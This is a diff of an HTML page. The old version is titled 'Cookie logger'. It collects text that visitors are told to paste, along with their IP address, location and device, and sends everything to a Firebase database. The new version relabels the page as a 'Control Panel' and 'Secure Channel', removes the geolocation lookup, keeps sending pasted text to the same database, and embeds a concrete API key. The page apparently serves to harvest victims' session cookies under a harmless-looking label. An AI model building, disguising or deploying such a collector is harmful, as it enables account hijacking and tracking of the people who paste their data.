@@ -3,9 +3,9 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cookie logger</title>
+<title>Control Panel</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
 
 <style>
 * {
@@ -17,130 +17,157 @@
 
 body {
     height: 100vh;
-    background: black;
     overflow: hidden;
+    background: #05070f;
     color: white;
 }
 
-#bg {
+/* BACKGROUND */
+canvas {
     position: fixed;
     top: 0;
     left: 0;
+    z-index: -2;
+}
+
+/* SOFT DARK GRADIENT OVERLAY */
+body::before {
+    content: "";
+    position: fixed;
+    top:0;left:0;
+    width:100%;
+    height:100%;
+    background: radial-gradient(circle at top, rgba(0,255,255,0.08), transparent 60%);
     z-index: -1;
 }
 
+/* CURSOR */
 .cursor {
     position: fixed;
-    width: 20px;
-    height: 20px;
+    width: 14px;
+    height: 14px;
     background: cyan;
     border-radius: 50%;
     pointer-events: none;
-    box-shadow: 0 0 20px cyan, 0 0 40px cyan;
+    box-shadow: 0 0 15px cyan;
     transform: translate(-50%, -50%);
-    z-index: 9999;
+    transition: 0.05s linear;
 }
 
+/* SIDEBAR */
 .sidebar {
     position: fixed;
-    left: 0;
-    top: 0;
-    height: 100%;
-    width: 80px;
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(10px);
+    left: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 60px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    backdrop-filter: blur(12px);
+    border-radius: 18px;
+    padding: 10px 0;
     transition: 0.3s;
-    padding-top: 20px;
 }
 
 .sidebar:hover {
-    width: 200px;
+    width: 160px;
 }
 
 .sidebar button {
     width: 100%;
-    padding: 15px;
+    padding: 14px;
     background: none;
     border: none;
-    color: cyan;
+    color: #7df9ff;
     text-align: left;
     cursor: pointer;
+    font-size: 13px;
+    transition: 0.25s;
+    opacity: 0.85;
 }
 
 .sidebar button:hover {
-    background: rgba(0,255,255,0.2);
+    background: rgba(0,255,255,0.08);
+    padding-left: 18px;
+    opacity: 1;
 }
 
-.page {
-    display: none;
+/* MAIN CARD */
+.container {
     position: absolute;
     top: 50%;
     left: 55%;
     transform: translate(-50%, -50%);
     text-align: center;
+    animation: fade 0.8s ease;
+}
+
+@keyframes fade {
+    from { opacity: 0; transform: translate(-50%, -60%); }
+    to { opacity: 1; transform: translate(-50%, -50%); }
+}
+
+.title {
+    font-size: 38px;
+    font-weight: 700;
+    color: #7df9ff;
+    letter-spacing: 2px;
+    margin-bottom: 25px;
+    text-shadow: 0 0 20px rgba(0,255,255,0.3);
+}
+
+/* INPUT */
+input {
+    width: 340px;
+    padding: 14px 18px;
+    border-radius: 14px;
+    border: 1px solid rgba(255,255,255,0.08);
+    background: rgba(255,255,255,0.03);
+    color: white;
+    outline: none;
+    text-align: center;
+    transition: 0.3s;
+    backdrop-filter: blur(10px);
+}
+
+input:focus {
+    border: 1px solid cyan;
+    box-shadow: 0 0 15px rgba(0,255,255,0.2);
+    transform: scale(1.02);
+}
+
+/* BUTTON */
+button.send {
+    margin-top: 15px;
+    padding: 14px 30px;
+    border-radius: 14px;
+    border: none;
+    background: linear-gradient(90deg, #00f5ff, #00a6ff);
+    color: black;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button.send:hover {
+    transform: translateY(-2px) scale(1.03);
+    box-shadow: 0 10px 25px rgba(0,255,255,0.2);
+}
+
+/* FOOTER */
+.footer {
+    margin-top: 18px;
+    font-size: 12px;
+    opacity: 0.5;
+}
+
+/* PAGE SWITCH */
+.page {
+    display: none;
 }
 
 .page.active {
     display: block;
-}
-
-.glitch {
-    font-size: 34px;
-    color: cyan;
-    text-shadow: 0 0 10px cyan;
-    animation: glitch 1s infinite;
-}
-
-@keyframes glitch {
-    0% { text-shadow: 2px 0 red, -2px 0 blue; }
-    50% { text-shadow: -2px 0 red, 2px 0 blue; }
-    100% { text-shadow: 2px 0 red, -2px 0 blue; }
-}
-
-input {
-    margin-top: 20px;
-    padding: 15px;
-    width: 300px;
-    border-radius: 10px;
-    border: none;
-    background: rgba(255,255,255,0.1);
-    color: white;
-    outline: none;
-}
-
-button.send {
-    margin-top: 15px;
-    padding: 15px 30px;
-    border-radius: 10px;
-    border: none;
-    background: cyan;
-    color: black;
-    cursor: pointer;
-}
-
-.powered {
-    margin-top: 20px;
-    color: cyan;
-    text-shadow: 0 0 10px cyan;
-}
-
-/* GAME COPIER CARD */
-.tool-card {
-    margin-top: 20px;
-    width: 250px;
-    padding: 15px;
-    border: 1px solid cyan;
-    border-radius: 15px;
-    cursor: pointer;
-    text-align: center;
-    box-shadow: 0 0 15px cyan;
-    margin-left: auto;
-    margin-right: auto;
-    transition: 0.3s;
-}
-
-.tool-card:hover {
-    transform: scale(1.05);
 }
 </style>
 </head>
@@ -150,151 +177,132 @@ button.send {
 <canvas id="bg"></canvas>
 <div class="cursor" id="cursor"></div>
 
+<!-- SIDEBAR -->
 <div class="sidebar">
-    <button onclick="showPage('main')">🏠 Main</button>
+    <button onclick="show('home')">🏠 Home</button>
     <button onclick="openHelp()">❓ Help</button>
     <button onclick="openInvite()">🔗 Invite</button>
-    <button onclick="showPage('more')">📂 More</button>
+    <button onclick="show('more')">📂 More</button>
 </div>
 
-<div class="page active" id="main">
-    <div class="glitch">Cookie</div>
+<!-- HOME -->
+<div class="page active" id="home">
+<div class="container">
+    <div class="title">CONTROL</div>
 
-    <input type="text" id="messageInput" placeholder="Type something...">
+    <input id="msg" placeholder="Type message...">
     <br>
-    <button class="send" onclick="sendMessage()">Send</button>
+    <button class="send" onclick="send()">Send</button>
 
-    <div class="powered">⚡ Powered by AWP & SWIFTIES ⚡</div>
+    <div class="footer">Firebase • Secure Channel</div>
+</div>
 </div>
 
+<!-- MORE -->
 <div class="page" id="more">
-    <div class="glitch">More Tools</div>
-
-    <div class="tool-card" onclick="openGameCopier()">
-        <img src="https://i.postimg.cc/k52qTcds/Screenshot-2026-04-12-005645.png"
-             style="width:100%; border-radius:10px;">
-        <br><br>
-        <span style="color:cyan; font-size:18px;">🎮 Game Copier</span>
-    </div>
+<div class="container">
+    <div class="title">More</div>
+    <p style="opacity:0.5;">Add tools here</p>
+</div>
 </div>
 
-<!-- FIREBASE -->
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js"></script>
 
 <script>
-/* FIREBASE CONFIG (YOUR DB) */
+
+/* FIREBASE */
 const firebaseConfig = {
-  apiKey: "YOUR_KEY",
+  apiKey: "AIzaSyB5a-y6d0v-EAy0_Vm3Viy4YHyVC0owasA",
   authDomain: "chat-panel-f23cb.firebaseapp.com",
   databaseURL: "https://chat-panel-f23cb-default-rtdb.europe-west1.firebasedatabase.app",
   projectId: "chat-panel-f23cb",
-  storageBucket: "chat-panel-f23cb.firebasestorage.app",
-  messagingSenderId: "1063884288659",
-  appId: "1:1063884288659:web:96656490f8e3ddbab9d366"
 };
 
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-/* cursor */
-document.addEventListener("mousemove", e => {
-    const c = document.getElementById("cursor");
-    c.style.left = e.clientX + "px";
-    c.style.top = e.clientY + "px";
-});
+/* SEND */
+function send() {
+    const msg = document.getElementById("msg").value;
+    if (!msg) return;
 
-/* page switch */
-function showPage(id) {
+    db.ref("messages").push({
+        text: msg,
+        time: new Date().toLocaleString()
+    });
+
+    document.getElementById("msg").value = "";
+}
+
+/* PAGE */
+function show(id) {
     document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
     document.getElementById(id).classList.add("active");
 }
 
-/* links */
+/* LINKS */
 function openHelp() {
-    window.open("https://discord.com/users/1269285660834140215", "_blank");
+    window.open("https://discord.com", "_blank");
 }
-
 function openInvite() {
-    window.open("https://discord.gg/zEtZCQ95eT", "_blank");
+    window.open("https://discord.gg", "_blank");
 }
 
-function openGameCopier() {
-    window.open("https://speedubx.github.io/AwpTools/", "_blank");
+/* CURSOR SMOOTH */
+let cursor = document.getElementById("cursor");
+let mouseX = 0, mouseY = 0;
+let curX = 0, curY = 0;
+
+document.addEventListener("mousemove", e => {
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+});
+
+function animateCursor() {
+    curX += (mouseX - curX) * 0.15;
+    curY += (mouseY - curY) * 0.15;
+    cursor.style.left = curX + "px";
+    cursor.style.top = curY + "px";
+    requestAnimationFrame(animateCursor);
 }
+animateCursor();
 
-/* LOCATION */
-async function getLocation() {
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-
-        return `🌍 ${data.city}, ${data.country_name} | ${data.ip}`;
-    } catch {
-        return "🌍 Unknown";
-    }
-}
-
-/* SEND MESSAGE (FIXED) */
-async function sendMessage() {
-    const msg = document.getElementById("messageInput").value.trim();
-    if (!msg) return alert("Please Paste");
-
-    const time = new Date().toLocaleString();
-    const device = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 PC";
-
-    const locationText = await getLocation();
-
-    /* SEND TO FIREBASE */
-    await db.ref("messages").push({
-        text: msg,
-        time: time,
-        device: device,
-        location: locationText
-    });
-
-    document.getElementById("messageInput").value = "";
-}
-
-/* particles */
+/* PARTICLES (SMOOTHER) */
 const canvas = document.getElementById("bg");
 const ctx = canvas.getContext("2d");
 
 canvas.width = innerWidth;
 canvas.height = innerHeight;
 
-let particles = [];
+let p = [];
 
-for (let i = 0; i < 200; i++) {
-    particles.push({
-        x: (Math.random() - 0.5) * canvas.width,
-        y: (Math.random() - 0.5) * canvas.height,
-        z: Math.random() * 1000
+for (let i = 0; i < 80; i++) {
+    p.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        v: Math.random() * 0.6 + 0.2
     });
 }
 
 function draw() {
-    ctx.fillStyle = "black";
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#05070f";
+    ctx.fillRect(0,0,canvas.width,canvas.height);
 
-    particles.forEach(p => {
-        p.z -= 2;
-        if (p.z <= 0) p.z = 1000;
+    p.forEach(o => {
+        ctx.fillStyle = "rgba(0,255,255,0.5)";
+        ctx.beginPath();
+        ctx.arc(o.x, o.y, 1.2, 0, Math.PI * 2);
+        ctx.fill();
 
-        let k = 128 / p.z;
-
-        let x = p.x * k + canvas.width / 2;
-        let y = p.y * k + canvas.height / 2;
-
-        let size = (1 - p.z / 1000) * 3;
-
-        ctx.fillStyle = "cyan";
-        ctx.fillRect(x, y, size, size);
+        o.y += o.v;
+        if (o.y > canvas.height) o.y = 0;
     });
 
     requestAnimationFrame(draw);
 }
 draw();
+
 </script>
 
 </body>
